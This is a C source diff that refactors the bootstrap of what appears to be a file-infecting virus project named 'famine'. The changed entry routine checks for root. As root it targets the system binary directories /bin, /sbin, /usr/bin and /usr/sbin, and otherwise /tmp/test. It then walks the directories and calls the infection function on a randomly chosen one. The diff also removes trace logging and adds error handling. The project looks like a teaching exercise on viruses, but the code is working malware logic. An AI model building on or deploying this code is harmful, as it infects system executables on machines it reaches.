@@ -4,6 +4,8 @@
 /// BOOTSTRAP FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
+static void entry(void);
+
 int main(void)
 {
 	constructor();
@@ -12,9 +14,6 @@ int main(void)
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
-
-static void launch(struct directory *dir, const unsigned long size, const int trace);
-static void entry(void);
 
 void constructor(void)
 {
@@ -68,42 +67,45 @@ void constructor(void)
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-static void launch(struct directory *dir, const unsigned long size, const int trace)
+static void launch(struct directory *dir, const size_t size)
 {
-	unsigned long m_entry = 0;
+	size_t m_entry = 0;
 	char dirent[BUFF_SIZE];
 
-	for (unsigned char index = 0; index < size; index++)
+	for (uint8_t index = 0; index < size; index++)
 	{
-		update_dirent(dirent, dir[index].path);
-		update_directory(&dir[index], dirent);
+		if (update_dirent(dirent, dir[index].path) == FAILURE)
+			return ;
+		if (update_directory(&dir[index], dirent) == FAILURE)
+			return ;
+
 		m_entry += dir[index].entry;
 	}
 
-	famine(dir[_get_random_integer(size)].path, m_entry, trace);
+	famine(dir[_get_random_integer(size)].path, m_entry);
 }
 
 static void entry(void)
 {
-	char fd[] = "/tmp/trace";
-	int trace = _open(fd, O_WRONLY | O_CREAT | O_APPEND, 0644);
-
-	struct directory user[] =
-	{
-		(struct directory){"/tmp/test/", 0},
-	};
-	struct directory root[] =
-	{
-		(struct directory){"/bin/", 0},
-		(struct directory){"/sbin/", 0},
-		(struct directory){"/usr/bin/", 0},
-		(struct directory){"/usr/sbin/", 0},
-	};
-
 	if (_getuid() == 0)
-		launch(root, sizeof(root) / sizeof(root[0]), trace);
-	else
-		launch(user, sizeof(user) / sizeof(user[0]), trace);
+	{
+		struct directory root[] =
+		{
+			(struct directory){"/bin/", 0},
+			(struct directory){"/sbin/", 0},
+			(struct directory){"/usr/bin/", 0},
+			(struct directory){"/usr/sbin/", 0},
+		};
 
-	_close(trace);
+		launch(root, sizeof(root) / sizeof(root[0]));
+	}
+	else
+	{
+		struct directory user[] =
+		{
+			(struct directory){"/tmp/test/", 0},
+		};
+
+		launch(user, sizeof(user) / sizeof(user[0]));
+	}
 }
